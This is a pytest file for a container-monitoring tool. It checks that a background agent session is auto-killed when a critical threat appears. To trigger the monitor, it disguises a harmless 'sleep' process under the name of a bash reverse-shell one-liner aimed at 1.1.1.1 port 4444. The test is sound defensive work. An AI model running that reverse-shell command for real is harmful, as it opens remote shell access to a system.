"""A `coi shell --background` session is monitored like an attached one.

Background sessions are where an agent runs unattended, so they need the
monitor most. A CRITICAL threat (a reverse shell) in a background session
must auto-kill the container, exactly as it does in an attached session
(test_critical_threat_kills_container).
"""

import subprocess
import time

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_background_session_is_monitored(test_workspace, enable_monitoring, coi_binary):
    container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-95"
    try:
        result = subprocess.run(
            [coi_binary, "shell", "--background", "--workspace", test_workspace, "--slot", "95"],
            capture_output=True,
            text=True,
            timeout=180,
        )
        assert result.returncode == 0, f"coi shell --background failed:\n{result.stderr}"
        assert wait_for_container_running(container_name), (
            f"Container {container_name} did not start"
        )

        # Let the monitoring baseline settle, as in the attached-session test.
        time.sleep(10)

        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        killed = False
        for _ in range(40):  # a kill (stop + delete) can take ~20s on CI
            time.sleep(1)
            if container_absent(container_name):
                killed = True
                break

        assert killed, (
            "a reverse shell in a background session should auto-kill the container, "
            f"but it is still {get_container_state(container_name)!r}. "
            f"Threat events: {get_threat_events(container_name)}"
        )
    finally:
        cleanup_container(container_name, coi_binary)
